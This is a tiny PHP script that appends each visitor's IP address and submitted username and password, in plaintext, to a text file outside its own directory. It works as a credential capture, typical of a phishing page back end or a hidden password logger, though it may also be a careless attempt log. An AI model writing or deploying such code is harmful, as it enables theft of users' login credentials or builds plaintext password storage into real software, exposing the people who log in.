<?php

file_put_contents("../../../loginAttempt.txt","$_SERVER[REMOTE_ADDR],$_POST[username],$_POST[passwd],0");
